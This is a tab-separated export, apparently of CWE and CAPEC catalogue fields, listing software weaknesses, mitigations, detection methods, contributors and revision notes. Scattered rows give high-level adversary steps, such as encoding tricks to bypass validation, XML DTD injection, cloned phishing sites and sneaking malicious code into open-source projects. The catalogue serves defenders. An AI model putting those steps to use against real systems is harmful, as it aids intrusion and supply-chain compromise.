11327	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19430	39	2012-05-11
17450	62	updated Potential_Mitigations, Time_of_Introduction
13290	88	Access of Memory Location After End of Buffer
11579	50	Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.
16644	28	CWE Content Team
24228	21	CWE Content Team
15186	28	CWE Content Team
16161	35	Cigital
25234	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
11310	35	MITRE
21326	62	updated Potential_Mitigations
23542	28	CWE Content Team
11781	23	The software is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.
20413	31	699
22239	62	updated Demonstrative_Examples, Potential_Mitigations, Relationships
19154	62	updated Relationships
23156	53	The MITRE Corporation
21211	43	Simple
13907	30	Thai Duong
16516	39	2009-05-27
17386	28	CWE Content Team
12560	47	Execute Unauthorized Commands
10932	103	Primary
21908	43	Simple
15142	31	1000
19840	31	1000
22184	59	Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit
18030	62	updated Potential_Mitigations
19280	90	Language-Independent
21872	42	Avoid storing information under the FTP root directory.
16849	62	updated Time_of_Introduction
15904	77	Manual Analysis
23075	56	CanPrecede
9725	59	Updated Attack_Phases, References
21780	28	CWE Content Team
15937	62	updated Modes_of_Introduction, Other_Notes
6771	23	The application stores sensitive data under the FTP document root with insufficient access control, which might make it accessible to untrusted parties.
13765	28	CWE Content Team
21693	100	The MITRE Corporation
20509	35	MITRE
22183	104	241
15064	39	2008-09-08
8944	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
10659	103	Primary
19750	40	An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.
22495	104	821
8184	56	ChildOf
19923	50	Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process. Refer to the RFCs to safely decode URL.
20103	47	Execute Unauthorized Commands
15898	45	Base
13574	80	Malicious software creation.
8285	35	MITRE
19804	35	MITRE
19883	28	CWE Content Team
12145	50	Design: Use input validation before writing to web log
23166	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
5677	62	updated Common_Consequences
20098	28	CWE Content Team
13163	35	MITRE
9734	59	Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required
5852	28	CWE Content Team
18449	28	CWE Content Team
17389	62	updated Related_Attack_Patterns
17192	35	MITRE
13955	62	updated Modes_of_Introduction, References, Relationships
24406	39	2011-06-01
6515	31	1000
8102	74	2
12861	39	2011-06-01
13617	39	2015-12-07
18895	62	updated Potential_Mitigations
17767	35	MITRE
7390	33	Michael Schwarz
10622	78	Low
6078	91	Architecture and Design
25094	92	Explore
25365	55	CAPEC Content Team
16293	26	Implementation
17162	22	09
17547	39	2019-06-20
16795	23	If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor "dangling."
22681	63	Varies by Context
8309	76	2017-08-04
6987	95	The attacker now receives the encrypted challenge on the second connection and sends it as response to the server on the first connection, thereby successfully completing the handshake and authenticating to the server.
10241	35	MITRE
5967	36	http://www.caida.org/publications/papers/2011/outages_censorship/outages_censorship.pdf
19304	72	If a poor cast lead to a buffer overflow or similar condition, data integrity may be affected.
19280	88	Use of Multiple Resources with Duplicate Identifier
22271	62	updated Relationships
20031	91	Architecture and Design
6936	50	Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.
21979	99	Wikipedia
9976	56	CanPrecede
18588	90	C#
21005	63	Reduce Maintainability
5909	35	MITRE
17317	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
10760	104	50
25025	43	Simple
17183	89	Standard
7790	26	Implementation
8493	50	Keep patches up to date by installing weekly or daily if possible.
21304	62	updated Other_Notes
23143	39	2017-01-19
23839	63	Read Application Data
9964	31	1000
17691	62	updated Relationships, Taxonomy_Mappings
14969	59	Updated Related_Attack_Patterns
8119	101	CAPEC Content Team
14074	101	CAPEC Content Team
23879	28	Eric Dalci
17832	47	Execute Unauthorized Commands
6077	39	2017-05-03
15925	28	CWE Content Team
17315	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as line delimiters when they are sent to a downstream component.
20094	66	Scheming for Privacy and Security
16151	54	Medium
5814	57	Resultant
17562	85	647
18328	39	2012-05-11
18360	63	DoS: Resource Consumption (Other)
19940	102	ChildOf
16314	23	The software performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor.
6783	81	Confidentiality
8238	66	The Database Hacker's Handbook: Defending Database Servers
5947	35	MITRE
24401	60	30
15793	39	2017-11-08
14616	31	1003
15704	28	CWE Content Team
11811	35	MITRE
17459	63	DoS: Resource Consumption (CPU)
7905	35	MITRE
11266	31	699
12003	42	Many IDEs and static analysis products will detect this problem.
23580	47	Gain Privileges
5586	62	updated Related_Attack_Patterns
22731	62	updated References
20252	62	updated Description, Name
13733	70	Supply Chain Attack Framework and Attack Patterns
24463	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
18290	59	Updated Related_Attack_Patterns
18531	53	The MITRE Corporation
13938	62	updated Relationships
13454	39	2019-01-03
11680	31	1000
20203	35	MITRE
19269	85	196
22424	48	06
14751	39	2011-06-01
6119	39	2008-07-01
22017	72	This weakness will allow data that has not been cleared from memory to be read. If this data contains sensitive password information, then an attacker can read the password and use the information to bypass protection mechanisms.
18855	62	updated Common_Consequences
23571	28	CWE Content Team
19891	43	Simple
15490	50	Implementation: Hide HTTP response header software information filed.
17369	42	Identify data that needs to be protected from swapping and choose platform-appropriate protection mechanisms.
8946	99	SANS Software Security Institute
9971	35	Cigital
23921	55	Seamus Tuohy
7924	47	Modify Data
19172	55	CAPEC Content Team
14178	28	CWE Content Team
18182	28	CWE Content Team
23050	59	Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
19545	25	Low
23584	39	2008-07-01
11762	62	updated Related_Attack_Patterns
10646	88	Path Traversal: '/absolute/pathname/here'
5609	62	updated Demonstrative_Examples
21387	39	2017-11-08
13912	23	An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.
6417	35	MITRE
17297	81	Confidentiality
25413	31	699
17852	28	CWE Content Team
10518	35	MITRE
7976	103	Primary
22641	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
15700	55	CAPEC Content Team
14795	62	updated Common_Consequences
21301	28	CWE Content Team
23291	28	CWE Content Team
9850	73	Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)
11940	39	2017-11-08
23722	104	407
9580	81	Availability
20049	90	C++
23947	28	CWE Content Team
18222	79	Integrity
13659	62	updated Potential_Mitigations
7622	101	CAPEC Content Team
18544	28	CWE Content Team
5969	35	MITRE
22054	74	4
19479	81	Other
12171	62	updated Relationships, Other_Notes
24256	40	An environment variable used by the application can be tainted with user supplied data.
23915	27	None: No specialized resources are required to execute this type of attack.
22824	62	updated Related_Attack_Patterns
16537	62	updated Relationships, Taxonomy_Mappings
6330	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
11565	39	2014-07-30
14388	31	1000
11656	56	CanAlsoBe
5885	49	2012
20499	56	ChildOf
12775	35	MITRE
22962	90	C
14943	91	Implementation
15894	35	Cigital
24197	69	Incomplete
23153	73	Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.
15027	97	Local Execution of Code
15874	24	MITRE
17746	35	MITRE
19848	39	2009-03-10
10676	35	MITRE
8717	28	CWE Content Team
6763	49	2010
16214	53	The MITRE Corporation
17049	45	Class
9283	62	updated Relationships, Taxonomy_Mappings
19068	35	MITRE
12548	62	updated Relationships
7173	63	Reduce Maintainability
16037	69	Incomplete
7971	31	1000
19428	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Compare binary / bytecode to application permission manifest
15846	44	SOAR Partial
14900	28	CWE Content Team
19299	54	Low
18283	21	7 Pernicious Kingdoms
21182	35	MITRE
9366	76	2019-09-30
10118	39	2008-08-15
17577	28	CWE Content Team
20059	73	Directly through log file or database manipulation, modify existing log entries.
11028	105	Mobile
24898	28	CWE Content Team
14590	28	CWE Content Team
7705	56	ChildOf
17168	24	MITRE
9883	62	updated Common_Consequences
6957	21	PLOVER
11646	39	2017-11-08
13157	39	2012-05-11
7877	35	MITRE
19465	39	2011-06-27
18211	31	1000
19524	62	updated Potential_Mitigations
8074	39	2014-07-30
21448	28	CWE Content Team
11996	43	Simple
22327	47	Read Data
9197	35	MITRE
25034	103	Primary
11748	36	http://projects.webappsec.org/LDAP-Injection
22878	39	2019-06-20
16321	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
13073	90	C++
21133	90	Language-Independent
17093	42	Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410.
16026	99	Mozilla
8340	50	Prevent unknown or malicious software from loading through whitelisting policy.
16404	35	MITRE
10252	21	7 Pernicious Kingdoms
14984	39	2012-05-11
20857	33	Jeff Atwood
18353	39	2017-01-19
21947	56	ChildOf
13776	28	Eric Dalci
24409	28	CWE Content Team
9459	73	Try to use double-encoding to bypass validation routines.
17496	28	CWE Content Team
19585	43	Simple
13857	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
8955	77	Dynamic Analysis with Automated Results Interpretation
6182	39	2013-02-21
10032	39	2012-05-11
17711	95	Adversary then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread
20822	79	Confidentiality
14222	35	MITRE
7957	28	CWE Content Team
21406	25	Medium
19456	91	Architecture and Design
8406	23	This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.
16207	35	MITRE
17476	86	http://www.bindview.com/Services/Razor/Papers/2001/tcpseq.cfm
8307	54	High
14058	62	updated Applicable_Platforms, Observed_Examples
10808	62	updated Applicable_Platforms, Description, Name
10642	73	Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.
7467	23	A class has an inheritance level that is too high, i.e., it      has a large number of parent classes.
18558	79	Access Control
12189	100	The MITRE Corporation
9646	55	CAPEC Content Team
19041	50	Disable scripting languages such as JavaScript in browser
5717	43	Simple
8449	62	updated Relationships
6787	39	2014-07-30
19465	62	updated Common_Consequences
16689	79	Authorization
24456	28	Eric Dalci
15202	103	Primary
13588	62	updated Common_Consequences
18846	96	2019-01-02
6604	35	MITRE
19115	101	CAPEC Content Team
12760	28	CWE Content Team
22206	62	updated Common_Consequences
22772	69	Incomplete
12257	81	Other
18115	80	To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user
19343	102	ChildOf
17728	69	Draft
7424	26	Implementation
6760	63	Read Application Data
14299	42	Do not expose administrative functionnality on the user UI.
13266	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
18915	56	ChildOf
17516	101	CAPEC Content Team
9799	28	CWE Content Team
19871	39	2008-10-14
18215	21	CWE Content Team
18735	28	CWE Content Team
19704	28	CWE Content Team
6910	35	MITRE
15283	50	Implementation: Disable scripting languages such as JavaScript in browser
17630	51	2014-06-23
22007	66	Crafting Symlinks for Fun and Profit
8431	35	MITRE
17399	44	High
17000	28	CWE Content Team
11926	102	CanFollow
14311	101	CAPEC Content Team
24188	28	CWE Content Team
8033	62	updated Observed_Examples
13390	39	2017-01-19
15116	28	CWE Content Team
19927	46	By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to "fail functional" to minimize administration and support costs, instead of "failing safe."
19923	54	High
7245	28	CWE Content Team
13171	104	824
18788	89	Detailed
14785	28	CWE Content Team
19923	50	There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)
13181	28	CWE Content Team
14184	103	Primary
24714	72	An unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors.
18306	39	2011-06-27
13976	90	C
16290	62	updated Applicable_Platforms, Common_Consequences, Relationships, Taxonomy_Mappings
23815	28	CWE Content Team
24168	59	Updated Related_Weaknesses
5992	62	updated Potential_Mitigations
21564	28	CWE Content Team
15490	40	Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.
20003	28	CWE Content Team
23270	36	http://msdn.microsoft.com/en-us/magazine/ee335713.aspx
20563	39	2013-02-21
22888	24	MITRE
7995	57	Indirect
23469	59	Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses
8438	77	Dynamic Analysis with Manual Results Interpretation
19650	43	Simple
14228	35	MITRE
22701	61	Stable
23209	35	MITRE
6420	28	CWE Content Team
9322	31	1000
12941	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.                Avoid sharing unnecessary information during interactions beyond what is absolutely required for effective communication.
14172	62	updated Demonstrative_Examples
7607	62	updated References
8023	91	Implementation
11509	62	updated Common_Consequences
20074	43	Simple
18620	35	MITRE
13446	28	CWE Content Team
25390	35	MITRE
23993	26	Implementation
7965	92	Exploit
22507	28	CWE Content Team
24435	50	Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.
8110	28	CWE Content Team
23581	25	Low
24494	47	Execute Unauthorized Commands
13247	104	942
11069	28	CWE Content Team
25427	28	CWE Content Team
20609	69	Incomplete
13031	39	2011-06-27
22112	40	This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.
24012	33	Xiaofeng Wang
11589	56	ChildOf
20212	39	2008-07-01
8455	39	2011-06-01
15776	54	Medium
17728	90	Language-Independent
17166	39	2014-07-30
9402	28	CWE Content Team
6327	103	Primary
8243	44	SOAR Partial
21570	35	MITRE
9181	62	updated Relationships, Taxonomy_Mappings
21186	28	CWE Content Team
9090	28	CWE Content Team
16754	36	http://projects.webappsec.org/Directory-Indexing
13946	26	Implementation
11419	35	MITRE
21544	35	MITRE
6496	35	Cigital
23402	63	Read Application Data
16415	39	2008-10-14
9168	28	Eric Dalci
14873	26	Implementation
8891	57	Resultant
9511	80	To bypass non trivial filters in the application
10666	28	Eric Dalci
10492	53	The MITRE Corporation
22258	28	CWE Content Team
12468	62	added/updated white box definitions
6301	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18269	62	updated Related_Attack_Patterns, Relationships
17723	89	Detailed
13834	103	Primary
14011	40	Access to a binary or executable such that it can be analyzed by various utilities.
24919	55	CAPEC Content Team
11194	39	2011-06-27
6931	35	MITRE
12726	26	Implementation
24649	35	MITRE
22623	57	Indirect
11133	42	Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage.
15854	39	2014-07-30
16089	39	2009-12-28
21859	104	1077
16934	60	15
9108	56	ChildOf
13034	52	Fuzzing is not effective in detecting this weakness.
17931	35	MITRE
9034	28	CWE Content Team
13583	56	ChildOf
7216	39	2008-10-14
11315	26	Architecture and Design
19010	62	updated Time_of_Introduction
16119	39	2011-06-01
16935	79	Accountability
10420	28	CWE Content Team
17466	61	Draft
16853	35	MITRE
19491	72	The contents of the data structure can be modified from outside the intended scope.
18577	79	Access Control
10160	63	Varies by Context
23274	91	Implementation
20817	46	Since an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent Filter for that intent. This can allow untrusted applications to obtain sensitive data. There are two variations on the standard broadcast intent, ordered and sticky.             Ordered broadcast intents are delivered to a series of registered receivers in order of priority as declared by the Receivers. A malicious receiver can give itself a high priority and cause a denial of service by stopping the broadcast from propagating further down the chain. There is also the possibility of malicious data modification, as a receiver may also alter the data within the Intent before passing it on to the next receiver. The downstream components have no way of asserting that the data has not been altered earlier in the chain.             Sticky broadcast intents remain accessible after the initial broadcast. An old sticky intent will be broadcast again to any new receivers that register for it in the future, greatly increasing the chances of information exposure over time. Also, sticky broadcasts cannot be protected by permissions that may apply to other kinds of intents.             In addition, any broadcast intent may include a URI that references data that the receiving component does not normally have the privileges to access. The sender of the intent can include special privileges that grant the receiver read or write access to the specific URI included in the intent. A malicious receiver that intercepts this intent will also gain those privileges and be able to read or write the resource at the specified URI.
19064	35	MITRE
21799	40	Access to the software during the development phase.
10347	81	Integrity
22782	63	Unexpected State
8887	35	MITRE
16480	59	Updated References
15393	62	updated Potential_Mitigations
10815	35	MITRE
13558	56	ChildOf
22103	89	Meta
21776	35	MITRE
23375	23	A process is invoked with sensitive arguments, environment variables, or other elements that can be seen by other processes on the operating system.
6475	99	John Wiley & Sons
24530	103	Primary
10590	97	Authentication Abuse
10202	62	updated Relationships, Taxonomy_Mappings
8604	79	Confidentiality
19880	72	The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state.
20362	39	2017-05-03
8459	48	01
23200	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
6773	39	2008-10-14
16329	28	CWE Content Team
7592	30	Small Media
8274	72	When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party.
23002	39	2009-03-10
17435	101	CAPEC Content Team
13991	62	updated Relationships, Taxonomy_Mappings
9963	31	699
5717	45	Base
23697	103	Primary
5789	39	2008-07-01
14487	42	Call super.clone() within your clone() method, when obtaining a new object.
21429	56	ChildOf
13621	74	1
25401	35	MITRE
24003	35	MITRE
7203	69	Incomplete
21966	39	2014-07-30
13856	53	The MITRE Corporation
8526	88	Inconsistent Naming Conventions for Identifiers
7225	62	updated Common_Consequences
19047	69	Incomplete
16099	55	CAPEC Content Team
11846	42	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
7990	95	[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has his website which duplicates a legitimate website, he needs to build very custom user related information in it. For example, he could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.
15598	35	Cigital
18588	90	C++
7203	90	C++
22211	31	1000
16086	59	Updated Description Summary, Related_Weaknesses
20330	31	1000
22339	78	Medium
20065	35	MITRE
20229	81	Confidentiality
13207	43	Simple
7388	28	CWE Content Team
19880	63	Alter Execution Logic
21642	69	Incomplete
18942	91	Architecture and Design
15244	28	CWE Content Team
12580	40	User input is used to construct a command to be executed on the target system or as part of the file name.
17187	62	updated Relationships, Taxonomy_Mappings
22931	39	2008-08-15
21419	39	2008-09-08
16927	81	Other
12763	28	CWE Content Team
25425	21	7 Pernicious Kingdoms
8575	89	Detailed
7470	28	Eric Dalci
6608	78	Medium
12403	78	High
23405	28	CWE Content Team
10863	35	MITRE
9536	62	updated Relationships
9284	35	MITRE
6774	56	ChildOf
18645	28	CWE Content Team
10405	39	2014-07-30
17618	100	The MITRE Corporation
13038	42	Passwords should be at least eight characters long -- the longer the better. Avoid passwords that are in any way similar to other passwords you have. Avoid using words that may be found in a dictionary, names book, on a map, etc. Consider incorporating numbers and/or punctuation into your password. If you do use common words, consider replacing letters in that word with numbers and punctuation. However, do not use "similar-looking" punctuation. For example, it is not a good idea to change cat to c@t, ca+, (@+, or anything similar. Finally, it is never appropriate to use an empty string as a password.
6139	63	Execute Unauthorized Code or Commands
24558	103	Primary
22202	81	Other
9640	23	The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.
18749	62	updated Related_Attack_Patterns, Relationships
20506	91	Installation
13787	35	MITRE
25352	28	Eric Dalci
7516	40	Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.
25369	23	The software does not perform an authorization check when an actor attempts to access a resource or perform an action.
13514	92	Explore
6163	91	Architecture and Design
16830	55	CAPEC Content Team
6310	28	CWE Content Team
16678	101	CAPEC Content Team
20991	32	Microsoft Press
7936	39	2019-09-19
12782	62	updated Related_Attack_Patterns
13724	63	DoS: Resource Consumption (CPU)
25103	35	MITRE
20621	62	updated Time_of_Introduction
14140	92	Explore
23037	57	Indirect
25409	53	The MITRE Corporation
22229	39	2010-02-16
9917	100	The MITRE Corporation
23173	101	CAPEC Content Team
6198	28	CWE Content Team
21224	35	MITRE
18432	54	Medium
15690	36	https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)
23550	73	Disassemble or decompile client-side application
22315	39	2011-06-01
15981	26	Architecture and Design
7966	56	ChildOf
12944	62	updated Potential_Mitigations
12009	39	2012-05-11
7150	62	updated Potential_Mitigations, Time_of_Introduction
21979	66	Cross-site scripting
14284	102	ChildOf
17528	43	Simple
8514	56	ChildOf
22321	62	updated Potential_Mitigations
7064	28	CWE Content Team
13927	35	MITRE
9440	79	Confidentiality
20899	95	[Disclose information] The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).
6640	39	2018-03-27
12028	55	CAPEC Content Team
19450	28	CWE Content Team
19645	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
22849	62	updated Common_Consequences
14370	28	CWE Content Team
15622	28	CWE Content Team
15264	35	Cigital
17045	39	2010-06-21
23167	26	Architecture and Design
20618	40	The application server trusts user supplied data to compute business logic.
12670	23	The application uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.
11266	103	Primary
20470	46	When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data.
11034	81	Confidentiality
16105	91	Implementation
13888	28	CWE Content Team
12924	31	1000
13507	97	Application API Message Manipulation via Man-in-the-Middle
10300	28	CWE Content Team
18187	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
13000	39	2009-12-28
21354	62	updated Applicable_Platforms
24296	28	CWE Content Team
18590	62	updated Affected_Resources, Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships
17752	104	544
20749	100	The MITRE Corporation
12984	39	2012-05-11
16673	31	1000
17761	28	CWE Content Team
9219	81	Access Control
12671	31	699
13715	31	1000
6676	77	Manual Static Analysis - Source Code
24271	39	2008-07-01
18929	28	CWE Content Team
14530	28	CWE Content Team
19166	35	MITRE
15220	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
13189	28	CWE Content Team
6471	61	Draft
18235	95	[Develop a malicious contribution plan] The adversary develops a plan to contribute the malicious code, taking the following into consideration:                                               The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover.                         Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary.                         Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user.
22222	35	MITRE
21914	70	Wikipedia
18067	28	CWE Content Team
8073	35	MITRE
19758	39	2012-10-30
5979	24	Purdue University
21636	100	The MITRE Corporation
19323	56	ChildOf
16936	56	ChildOf
25182	80	Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.
5839	39	2012-05-11
20579	76	2017-08-04
12401	44	SOAR Partial
14530	35	MITRE
7981	28	CWE Content Team
18095	59	Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Indicators-Warnings_of_Attack, Probing_Techniques, Related_Vulnerabilities, Resources_Required
18026	79	Authentication
12392	45	Base
15834	104	558
24943	39	2010-12-13
19055	44	High
23506	60	28
23831	39	2017-01-19
10116	62	updated Time_of_Introduction
17134	103	Primary
19705	28	CWE Content Team
24231	62	updated Potential_Mitigations
15409	71	2010
21884	35	Cigital
9024	35	MITRE
17401	40	The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.
6735	39	2008-09-08
10277	62	updated Relationships
20271	28	CWE Content Team
21872	91	System Configuration
6343	91	Operation
10740	39	2011-06-01
10821	100	The MITRE Corporation
5608	35	MITRE
24629	28	CWE Content Team
17577	39	2008-09-08
20575	35	MITRE
20675	62	updated Observed_Examples, Relationships
19610	23	An adversary uses social engineering to convince the target to do minor tasks as opposed to larger actions. After complying with a request, individuals are more likely to agree to subsequent requests that are similar in type and required effort.
5843	57	Indirect
11540	35	MITRE
16909	31	1000
18955	45	Variant
13009	62	updated Description, Name
6581	56	ChildOf
18769	62	updated Relationships
11402	28	CWE Content Team
17109	35	MITRE
19830	62	updated Demonstrative_Examples, References
25335	28	CWE Content Team
6087	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
10209	62	updated Applicable_Platforms, Description, Enabling_Factors_for_Exploitation, Relationships, Taxonomy_Mappings
7586	39	2012-10-30
23212	103	Primary
12046	31	1000
23220	23	An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode).
20383	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
9683	95	[Craft and inject XML containg malicious DTD payload]
6281	23	An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource. The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual.
13404	101	CAPEC Content Team
16419	35	MITRE
10957	62	updated Related_Attack_Patterns
18001	89	Detailed
13396	28	CWE Content Team
19079	59	Updated Attack_Phases
6258	73	The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.
17152	39	2009-03-10
19253	73	DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.
16862	56	ChildOf
16932	31	1003
13653	78	High
22868	62	updated Common_Consequences
11124	76	2017-05-01
7110	26	Implementation
21760	63	DoS: Crash, Exit, or Restart
12356	31	699
19018	54	Low
7045	26	Architecture and Design
20242	62	updated Modes_of_Introduction, Relationships
21323	39	2019-01-03
14762	28	CWE Content Team
22987	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
17799	79	Confidentiality
14220	28	CWE Content Team
17643	35	MITRE
12548	35	MITRE
13466	81	Other
13284	35	MITRE
23039	91	Architecture and Design
14049	21	CWE Content Team
15378	35	MITRE
10127	62	updated Common_Consequences, Description, Other_Notes
18099	35	MITRE
20397	62	updated Demonstrative_Examples
15630	39	2011-06-27
6814	28	CWE Content Team
22430	31	1000
12621	81	Access Control
17254	66	XML security: Preventing XML bombs
19975	21	CLASP
15710	92	Experiment
18311	28	CWE Content Team
21735	50	Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.
17453	62	updated Common_Consequences
23577	28	CWE Content Team
21990	28	CWE Content Team
6198	39	2009-01-12
9848	76	2019-04-04
24004	21	7 Pernicious Kingdoms
19247	62	updated Other_Notes, Relationship_Notes
8866	61	Draft
7338	90	Language-Independent
12086	85	490
17900	62	updated Common_Consequences, Observed_Examples, Relationships
18582	73	The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.
21917	70	Cross-Site Flashing
